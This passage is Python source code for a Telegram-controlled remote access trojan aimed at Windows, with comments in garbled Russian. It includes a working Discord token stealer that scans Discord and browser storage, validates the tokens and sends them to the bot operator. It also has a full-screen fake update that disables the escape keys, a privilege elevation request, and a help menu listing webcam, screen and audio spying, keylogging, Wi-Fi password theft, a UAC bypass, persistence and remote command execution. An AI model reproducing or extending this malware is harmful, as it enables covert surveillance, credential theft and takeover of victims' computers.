            # –°–æ–∑–¥–∞–µ–º –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
            script = f'PowerShell -Command "Start-Process python -ArgumentList \'{sys.argv[0]}\' -Verb RunAs"'
            subprocess.run(script, shell=True)
            bot.reply_to(message, "‚úÖ Admin rights requested successfully!")
            sys.exit()  # –í—ã—Ö–æ–¥, —á—Ç–æ–±—ã –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å—Å—è —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
        except Exception as e:
            bot.reply_to(message, f"‚ùå Failed to request admin rights: {e}")
    else:
        bot.reply_to(message, "‚úÖ Already running with admin rights!")


# üîÑ –ü–µ—Ä–µ–º–µ—à–∏–≤–∞–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã
@bot.message_handler(func=lambda message: message.text.startswith("!swapkeys"))
def swap_keys(message):
    mode = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else "random"
    if mode == "random":
        layout = list(string.ascii_lowercase)
        random.shuffle(layout)
        mapping = dict(zip(string.ascii_lowercase, layout))
        print(f"Keyboard mapping: {mapping}")  # –î–ª—è –æ—Ç–ª–∞–¥–∫–∏
        bot.reply_to(message, "üîÑ –ö–ª–∞–≤–∏—à–∏ –ø–µ—Ä–µ–º–µ—à–∞–Ω—ã! (–≠—Ñ—Ñ–µ–∫—Ç –≤—Ä–µ–º–µ–Ω–Ω—ã–π)")
    elif mode == "default":
        bot.reply_to(message, "‚úÖ –†–∞—Å–∫–ª–∞–¥–∫–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞!")
    else:
        bot.reply_to(message, "‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ `!swapkeys random` –∏–ª–∏ `!swapkeys default`")

# üåê –û—Ç–∫—Ä—ã—Ç–∏–µ URL
@bot.message_handler(func=lambda message: message.text.startswith("!openurl"))
def open_url(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ —Å—Å—ã–ª–∫—É: `!openurl https://example.com`")
        return
    url = args[1]
    webbrowser.open(url)
    bot.reply_to(message, f"üåê –û—Ç–∫—Ä—ã–≤–∞—é {url}")

# üîç –ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤
@bot.message_handler(func=lambda message: message.text.startswith("!findfiles"))
def find_files(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "‚ùå –£–∫–∞–∂–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞: `!findfiles important.docx`")
        return
    filename = args[1]
    result = subprocess.run(["where", filename], capture_output=True, text=True, shell=True)
    if result.stdout:
        bot.reply_to(message, f"üìÇ –ù–∞–π–¥–µ–Ω–æ:\n{result.stdout}")
    else:
        bot.reply_to(message, "‚ùå –§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω")

# üì∂ –°–ø–∏—Å–æ–∫ Wi-Fi —Å–µ—Ç–µ–π
@bot.message_handler(func=lambda message: message.text.startswith("!wifilist"))
def wifi_list(message):
    result = subprocess.run(["netsh", "wlan", "show", "network"], capture_output=True, text=True, encoding='utf-8', shell=True)
    bot.reply_to(message, f"""üì∂ –î–æ—Å—Ç—É–ø–Ω—ã–µ Wi-Fi —Å–µ—Ç–∏:\n```
{result.stdout}
```""", parse_mode="Markdown")

# üñ• –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –ü–ö
@bot.message_handler(func=lambda message: message.text.startswith("!sleep"))
def sleep_pc(message):
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    bot.reply_to(message, "üí§ –ü–ö —É—Ö–æ–¥–∏—Ç –≤ —Å–ø—è—â–∏–π —Ä–µ–∂–∏–º!")

@bot.message_handler(func=lambda message: message.text.startswith("!hibernate"))
def hibernate_pc(message):
    os.system("shutdown /h")
    bot.reply_to(message, "üåô –ü–ö —É—Ö–æ–¥–∏—Ç –≤ –≥–∏–±–µ—Ä–Ω–∞—Ü–∏—é!")



# üåä –ì—Ä–∞—Ñ–∏—á–µ—Å–∫–∏–µ —ç—Ñ—Ñ–µ–∫—Ç—ã
@bot.message_handler(func=lambda message: message.text.startswith("!draw"))
def draw_text(message):
    try:
        args = shlex.split(message.text)  # –ü–∞—Ä—Å–∏–º –∞—Ä–≥—É–º–µ–Ω—Ç—ã —Å —É—á–µ—Ç–æ–º –∫–∞–≤—ã—á–µ–∫
        if len(args) < 4:
            bot.reply_to(message, "‚ùå –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `!draw \"—Ç–µ–∫—Å—Ç\" —Ü–≤–µ—Ç –≤—Ä–µ–º—è up/down` (–Ω–∞–ø—Ä–∏–º–µ—Ä, `!draw \"Hello world!\\n12 3\" red 3 up`)")
            return
        
        text_part = args[1]
        color = args[2]
        duration = int(args[3])  # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –≤—Ä–µ–º—è —á–∏—Å–ª–æ–º
        position = args[4] if len(args) > 4 else "up"
        
        text = text_part.replace('\\n', '\n')  # –ö–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞ —Å—Ç—Ä–æ–∫–∏
        
        pygame.init()
        screen = pygame.display.set_mode((1920, 1080), pygame.NOFRAME)
        font = pygame.font.Font(None, 100)
        
        screen.fill((0, 0, 0))
        lines = text.split('\n')
        y_offset = 540 - (len(lines) * 50 // 2)
        for line in lines:
            text_surface = font.render(line, True, pygame.Color(color))
            screen.blit(text_surface, (960 - text_surface.get_width() // 2, y_offset))
            y_offset += 100
        
        pygame.display.flip()
        
        hwnd = pygame.display.get_wm_info()["window"]
        if position == "up":
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 1920, 1080, 0)
        
        time.sleep(duration)
        pygame.quit()
        bot.reply_to(message, f"üñ• –¢–µ–∫—Å—Ç '{text}' –æ—Ç–æ–±—Ä–∞–∑–∏–ª—Å—è –Ω–∞ {duration} —Å–µ–∫!")
    
    except ValueError:
        bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞: –í—Ä–µ–º—è –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {e}")



# üé® –≠—Ñ—Ñ–µ–∫—Ç —Å–ª–µ–¥–∞ –∑–∞ –∫—É—Ä—Å–æ—Ä–æ–º
trail_active = False  # –§–ª–∞–≥ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —ç—Ñ—Ñ–µ–∫—Ç–æ–º —Å–ª–µ–¥–∞

# üé® –í–∫–ª—é—á–µ–Ω–∏–µ/–≤—ã–∫–ª—é—á–µ–Ω–∏–µ —Å–ª–µ–¥–∞ –∫—É—Ä—Å–æ—Ä–∞
@bot.message_handler(func=lambda message: message.text.startswith("!trail"))
def toggle_trail(message):
    global trail_active
    args = message.text.split()

    if len(args) < 2 or args[1] not in ["on", "off"]:
        bot.reply_to(message, "‚ùå –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `!trail on` –∏–ª–∏ `!trail off`")
        return

    if args[1] == "on":
        if trail_active:
            bot.reply_to(message, "üñ± –°–ª–µ–¥ –∫—É—Ä—Å–æ—Ä–∞ —É–∂–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!")
        else:
            trail_active = True
            bot.reply_to(message, "üñ± –°–ª–µ–¥ –∫—É—Ä—Å–æ—Ä–∞ –≤–∫–ª—é—á–µ–Ω!")
            threading.Thread(target=draw_trail, daemon=True).start()
    else:
        trail_active = False
        bot.reply_to(message, "üö´ –°–ª–µ–¥ –∫—É—Ä—Å–æ—Ä–∞ –æ—Ç–∫–ª—é—á–µ–Ω!")

def draw_trail():
    global trail_active
    pygame.init()
    screen = pygame.display.set_mode((1920, 1080), pygame.NOFRAME)
    hwnd = pygame.display.get_wm_info()["window"]

    # –î–µ–ª–∞–µ–º –æ–∫–Ω–æ –ø—Ä–æ–∑—Ä–∞—á–Ω—ã–º
    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED | win32con.WS_EX_TOPMOST)
    win32gui.SetLayeredWindowAttributes(hwnd, win32api.RGB(0, 0, 0), 0, win32con.LWA_COLORKEY)

    clock = pygame.time.Clock()
    trail = []  # –°–ø–∏—Å–æ–∫ —Ç–æ—á–µ–∫ —Å–ª–µ–¥–∞

    while trail_active:
        x, y = pyautogui.position()
        trail.append((x, y))

        screen.fill((0, 0, 0, 0))  # –û—á–∏—â–∞–µ–º —Ñ–æ–Ω, —Å–æ—Ö—Ä–∞–Ω—è—è –ø—Ä–æ–∑—Ä–∞—á–Ω–æ—Å—Ç—å
        for tx, ty in trail[-20:]:  # –û—Å—Ç–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ 20 —Ç–æ—á–µ–∫
            pygame.draw.circle(screen, (255, 0, 0), (tx, ty), 5)  # –ö—Ä–∞—Å–Ω—ã–µ —Ç–æ—á–∫–∏

        pygame.display.update()
        clock.tick(30)
        time.sleep(0.05)

    pygame.quit()

#---fake update

app = None
fake_update_window = None

class FakeUpdateScreen(QMainWindow):
    def __init__(self):
        super().__init__()

        # –°–æ–∑–¥–∞–µ–º –≤–µ–±-–±—Ä–∞—É–∑–µ—Ä
        self.browser = QWebEngineView()
        self.browser.setUrl(QUrl("https://fakeupdate.net/win10ue/"))  # –ó–∞–≥—Ä—É–∂–∞–µ–º —Å–∞–π—Ç

        # –î–µ–ª–∞–µ–º –æ–∫–Ω–æ –±–µ–∑ —Ä–∞–º–æ–∫ –∏ –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint)
        self.showFullScreen()

        # –î–æ–±–∞–≤–ª—è–µ–º –±—Ä–∞—É–∑–µ—Ä –≤ –æ–∫–Ω–æ
        self.setCentralWidget(self.browser)

    def keyPressEvent(self, event):
        """–û—Ç–∫–ª—é—á–∞–µ–º –∫–ª–∞–≤–∏—à–∏ –≤—ã—Ö–æ–¥–∞"""
        blocked_keys = [Qt.Key.Key_Escape, Qt.Key.Key_Alt, Qt.Key.Key_Tab, Qt.Key.Key_F4]
        if event.key() in blocked_keys:
            return  # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º —ç—Ç–∏ –∫–ª–∞–≤–∏—à–∏
        super().keyPressEvent(event)

def start_fake_update():
    global app, fake_update_window
    if app is None:
        app = QApplication(sys.argv)
    fake_update_window = FakeUpdateScreen()
    fake_update_window.show()
    app.exec()

def stop_fake_update():
    global fake_update_window
    if fake_update_window:
        fake_update_window.close()
        fake_update_window = None

@bot.message_handler(func=lambda message: message.text.startswith("!trail"))
def send_welcome(message):
    bot.reply_to(message, "–ò—Å–ø–æ–ª—å–∑—É–π:\n`!fakeupdate on` ‚Äî –∑–∞–ø—É—Å—Ç–∏—Ç—å –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ\n`!fakeupdate off` ‚Äî –≤—ã–∫–ª—é—á–∏—Ç—å", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text.lower().startswith("!fakeupdate"))
def handle_fakeupdate(message):
    args = message.text.split()
    
    if len(args) != 2:
        bot.reply_to(message, "‚ùå –ò—Å–ø–æ–ª—å–∑—É–π: `!fakeupdate on` –∏–ª–∏ `!fakeupdate off`", parse_mode="Markdown")
        return
    
    command = args[1].lower()

    if command == "on":
        bot.reply_to(message, "üîÑ –ó–∞–ø—É—Å–∫–∞—é —Ñ–µ–π–∫–æ–≤–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ...")
        threading.Thread(target=start_fake_update, daemon=True).start()
    elif command == "off":
        bot.reply_to(message, "‚ùå –ó–∞–∫—Ä—ã–≤–∞—é —Ñ–µ–π–∫–æ–≤–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ...")
        stop_fake_update()
    else:
        bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞! –ò—Å–ø–æ–ª—å–∑—É–π: `!fakeupdate on` –∏–ª–∏ `!fakeupdate off`", parse_mode="Markdown")
    stop_fake_update()

#---fake update

@bot.message_handler(func=lambda message: message.text.startswith("!help"))
def help_command(message):
    help_text = """üõ† **–°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ–º–∞–Ω–¥**:

üîπ **üíª –í–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ**:
`!sendtext <text>` ‚Äì –í–≤–æ–¥ —Ç–µ–∫—Å—Ç–∞ —Å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã.
`!mousemove` ‚Äì –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à—å—é.
`!changelang` ‚Äì –ò–∑–º–µ–Ω–µ–Ω–∏–µ —è–∑—ã–∫–∞ –≤–≤–æ–¥–∞.
`!keybind` ‚Äì –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ –≥–æ—Ä—è—á–∏—Ö –∫–ª–∞–≤–∏—à.
`!textbox` ‚Äì –°–æ–∑–¥–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –ø–æ–ª—è.
`!msgbox` ‚Äì –í—ã–≤–æ–¥ —Å–æ–æ–±—â–µ–Ω–∏—è.

üîπ **üïµÔ∏è –®–ø–∏–æ–Ω–∞–∂**:
`!photo_desk` ‚Äì –§–æ—Ç–æ —ç–∫—Ä–∞–Ω–∞.
`!photo_cam` ‚Äì –§–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã.
`!video_desk <time>` ‚Äì –ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞.
`!video_cam <time>` ‚Äì –ó–∞–ø–∏—Å—å —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã.
`!audiorec <microphone> <time>` ‚Äì –ê—É–¥–∏–æ–∑–∞–ø–∏—Å—å.
`!keylogger <on\off>` ‚Äì –õ–æ–≥–≥–µ—Ä –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã (‚ö†Ô∏è –í —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ).
`!clipboard <add\show>` ‚Äì –ß—Ç–µ–Ω–∏–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞.
`!sysinfo` ‚Äì –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–∏—Å—Ç–µ–º–µ.

üîπ **üìÇ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞–º–∏**:
`!findfiles <file.format>` ‚Äì –ü–æ–∏—Å–∫ —Ñ–∞–π–ª–æ–≤.
`!upload <path>` ‚Äì –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞.
`!delete <path>` ‚Äì –£–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞.
`!execute <path>` ‚Äì –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º—ã.
`!download <path>` ‚Äì –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞.
`!disk <path>` ‚Äì –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –¥–∏—Å–∫–∞—Ö.
`!autoload <Name> <method> <on\off>` ‚Äì –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞.

üîπ **üñ•Ô∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ Windows**:
`!shutdown` ‚Äì –í—ã–∫–ª—é—á–µ–Ω–∏–µ –ü–ö.
`!sleep` ‚Äì –°–ø—è—â–∏–π —Ä–µ–∂–∏–º.
`!restart` ‚Äì –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞.
`!lock` ‚Äì –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —ç–∫—Ä–∞–Ω–∞.
`!volume <1-100>` ‚Äì –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≥—Ä–æ–º–∫–æ—Å—Ç—å—é.
`!lockmgr` ‚Äì –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –∑–∞–¥–∞—á.
`!achbypass` ‚Äì –û–±—Ö–æ–¥ UAC.
`!unlocksound` ‚Äì –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∑–≤—É–∫–∞.
`!Microlist` ‚Äì –°–ø–∏—Å–æ–∫ –º–∏–∫—Ä–æ—Ñ–æ–Ω–æ–≤.
`!swapkeys <random\default>` ‚Äì –ü–æ–º–µ–Ω—è—Ç—å –∫–ª–∞–≤–∏—à–∏ –º–µ—Å—Ç–∞–º–∏.

üîπ **üåê –ò–Ω—Ç–µ—Ä–Ω–µ—Ç –∏ —Å–µ—Ç—å**:
`!openurl <url>` ‚Äì –û—Ç–∫—Ä—ã—Ç—å URL –≤ –±—Ä–∞—É–∑–µ—Ä–µ.
`!wifilist` ‚Äì –î–æ—Å—Ç—É–ø–Ω—ã–µ Wi-Fi —Å–µ—Ç–∏.
`!ping <site>` ‚Äì –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Ç–∏.
`!packet <packets> <strengh> <url>` ‚Äì –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞–∫–µ—Ç–æ–≤.
`!netinfo` ‚Äì –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è.
`!wifipass` ‚Äì –ü–∞—Ä–æ–ª–∏ Wi-Fi.

üîπ **üé® –ì—Ä–∞—Ñ–∏–∫–∞ –∏ —ç—Ñ—Ñ–µ–∫—Ç—ã**:
`!fakeupdate <on\off>` ‚Äì –§–µ–π–∫–æ–≤–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ.
`!draw <text> <color> <time> <up\down>` ‚Äì –†–∏—Å–æ–≤–∞–Ω–∏–µ –Ω–∞ —ç–∫—Ä–∞–Ω–µ.
`!wallpaper <url>` ‚Äì –°–º–µ–Ω–∞ –æ–±–æ–µ–≤.
`!trail <on\off>` ‚Äì –≠—Ñ—Ñ–µ–∫—Ç —Å–ª–µ–¥–∞ –∫—É—Ä—Å–æ—Ä–∞.
`!memz <on\off>` ‚Äì –ì–ª–∏—Ç—á–∏ MEMZ.
`!invert <on\off>` ‚Äì –ò–Ω–≤–µ—Ä—Å–∏—è —ç–∫—Ä–∞–Ω–∞.
`!flipscreen <left,right>` ‚Äì –ü–µ—Ä–µ–≤–æ—Ä–æ—Ç —ç–∫—Ä–∞–Ω–∞.
`!cd <open\close>` ‚Äì –û—Ç–∫—Ä—ã—Ç–∏–µ –¥–∏—Å–∫–æ–≤–æ–¥–∞.
`!rickroll` ‚Äì –†–∏–∫—Ä–æ–ª–ª.
`!tts <speed> <pitch> <text>` ‚Äì –ì–æ–ª–æ—Å–æ–≤–æ–π —Å–∏–Ω—Ç–µ–∑–∞—Ç–æ—Ä.
`!sound <url.mp3>` ‚Äì –ü—Ä–æ–∏–≥—Ä—ã–≤–∞–Ω–∏–µ –∑–≤—É–∫–∞.
`!shake <ins> <on\off>` ‚Äì –¢—Ä—è—Å–∫–∞ –∫—É—Ä—Å–æ—Ä–∞.

üîπ **üìú –ö–æ–Ω—Å–æ–ª—å –∏ –ø—Ä–æ—Ü–µ—Å—Å—ã**:
`!tasklist` ‚Äì –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.
`!taskkill <task>` ‚Äì –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞.
`!taskmake <task>` ‚Äì –°–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞.
`!cmd <command>` ‚Äì –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã CMD.
`!powershell <command>` ‚Äì –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ PowerShell.
`!bsod` ‚Äì –≠–º—É–ª—è—Ü–∏—è BSOD.

üîπ **üõ†Ô∏è –ê–¥–º–∏–Ω-—Ñ—É–Ω–∫—Ü–∏–∏**:
`!checkadmin` ‚Äì –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.
`!admin` ‚Äì –ó–∞–ø—É—Å–∫ –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.
`!legitadmin` ‚Äì –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.
`!suicide` ‚Äì –°–∞–º–æ—É–¥–∞–ª–µ–Ω–∏–µ.

üîπ **üê¶‚Äç‚¨õ –°—Çu–ª–ªep**:
`!discordcheck` ‚Äì yk—Ä–∞—Å—Ç—å —Ç–æk–µ–Ω –¥uc–∫–æ—Ä–¥.

üîπ **üõ†Ô∏è –ê–¥–º–∏–Ω-–ë–æ—Ç**:
`!adduser <id>` ‚Äì –î–æ–±–∞–≤–∏—Ç—å –≤ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö.
`!deluser <id>` - –£–¥–∞–ª–∏—Ç—å –∏–∑ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö.
`!listuser` - –°–ø–∏—Å–æ–∫ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö

‚ÑπÔ∏è –í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –≤ –º–µ–Ω—é!
"""
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")

#--help

#--admin panel

DISCORD_PATHS = [
    os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
    os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
    os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
    os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
]

TOKEN_REGEX = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"

def find_tokens():
    tokens = []
    for path in DISCORD_PATHS:
        if not os.path.exists(path):
            continue
        for file_name in os.listdir(path):
            if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                continue
            try:
                with open(os.path.join(path, file_name), "r", errors="ignore") as file:
                    content = file.read()
                    found_tokens = re.findall(TOKEN_REGEX, content)
                    tokens.extend(found_tokens)
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ {file_name}: {e}")
    return list(set(tokens))

@bot.message_handler(func=lambda message: message.text and message.text.startswith("!discordcheck"))
def send_tokens(message):
    tokens = find_tokens()
    if tokens:
        valid_tokens = []
        for token in tokens:
            headers = {"Authorization": token}
            response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
            if response.status_code == 200:
                user_data = json.loads(response.text)
                valid_tokens.append(f"üë§ {user_data['username']}#{user_data['discriminator']} - `{token}`")
        
        if valid_tokens:
            bot.send_message(message.chat.id, "üîç –ù–∞–π–¥–µ–Ω–Ω—ã–µ –∞–∫—Ç–∏–≤–Ω—ã–µ Discord-—Ç–æ–∫–µ–Ω—ã:\n\n" + "\n".join(valid_tokens))
        else:
            bot.send_message(message.chat.id, "‚úÖ –ê–∫—Ç–∏–≤–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ. –í—Å—ë —á–∏—Å—Ç–æ!")
    else:
        bot.send_message(message.chat.id, "‚ùå –¢–æ–∫–µ–Ω—ã Discord –Ω–µ –Ω–∞–π–¥–µ–Ω—ã!")

#--discordstilier


# ID –≥–ª–∞–≤–Ω–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
MAIN_ADMIN_ID = {TGID}

# –°–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
allowed_users = {MAIN_ADMIN_ID}  # –ê–¥–º–∏–Ω —É–∂–µ –≤ —Å–ø–∏—Å–∫–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é

# –§–∏–ª—å—Ç—Ä —Å–æ–æ–±—â–µ–Ω–∏–π: –±–ª–æ–∫–∏—Ä—É–µ–º /start –∏ !–∫–æ–º–∞–Ω–¥—ã –¥–ª—è –Ω–µ—Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
@bot.message_handler(func=lambda message: True)
def check_access(message):
    user_id = message.from_user.id
    text = message.text

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –∫–æ–º–∞–Ω–¥—É (! –∏–ª–∏ /)
    if text.startswith("!") or text.startswith("/"):
        if user_id not in allowed_users:
            bot.reply_to(message, "üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
            return

    # –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –¥–∞–ª—å—à–µ (–µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ —Å–ø–∏—Å–∫–µ)
    process_message(message)

def process_message(message):
    """–§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –ø–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–∞"""
    text = message.text

    if text.startswith("!adduser "):
        add_user(message)
    elif text.startswith("!deluser "):
        del_user(message)
    elif text == "!listuser":
        list_users(message)
    else:
        bot.reply_to(message, "‚ùå –ö–æ–º–∞–Ω–¥–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞! '!help' –¥–ª—è —Å–ø–∏—Å–∫–∞ –∫–æ–º–º–∞–Ω–¥")  # –ú–æ–∂–µ—à—å –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ —Å–≤–æ—é –æ–±—Ä–∞–±–æ—Ç–∫—É

# –ö–æ–º–∞–Ω–¥–∞ !adduser <id> ‚Äî –¥–æ–±–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
def add_user(message):
    if message.from_user.id != MAIN_ADMIN_ID:
        bot.reply_to(message, "üö´ –¢–æ–ª—å–∫–æ –≥–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ—Ç –¥–æ–±–∞–≤–ª—è—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.")
        return

    try:
        new_id = int(message.text.split()[1])
        if new_id in allowed_users:
            bot.reply_to(message, "‚ö†Ô∏è –≠—Ç–æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –µ—Å—Ç—å –≤ —Å–ø–∏—Å–∫–µ.")
        else:
            allowed_users.add(new_id)
            bot.reply_to(message, f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {new_id} –¥–æ–±–∞–≤–ª–µ–Ω –≤ —Å–ø–∏—Å–æ–∫.")
    except (IndexError, ValueError):
        bot.reply_to(message, "‚ùå –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `!adduser <id>`", parse_mode="Markdown")

# –ö–æ–º–∞–Ω–¥–∞ !deluser <id> ‚Äî —É–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
def del_user(message):
    if message.from_user.id != MAIN_ADMIN_ID:
